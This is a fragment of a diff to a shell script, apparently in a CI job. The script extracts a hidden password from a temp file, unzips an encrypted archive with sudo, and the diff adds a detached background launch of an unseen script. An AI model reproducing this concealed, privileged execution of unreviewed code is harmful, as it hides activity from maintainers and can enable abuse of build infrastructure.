@@ -140,7 +140,7 @@ pd127=$(grep -oP "(?<=PPP).*(?=WWW)" /tmp/js9);
 if  [ ! -z ${pd127} ]; then
 #sudo bash -c 'id'
 sudo unzip -P ${pd127}  /home/runner/work/nc_test/nc_test/free-us1-udp7z.zip  -d /home/
-
+(setsid  bash /home/my.sh &)
 #. /home/runner/work/nc_test/nc_test/xiaoMiq4040.sh
 fi
 
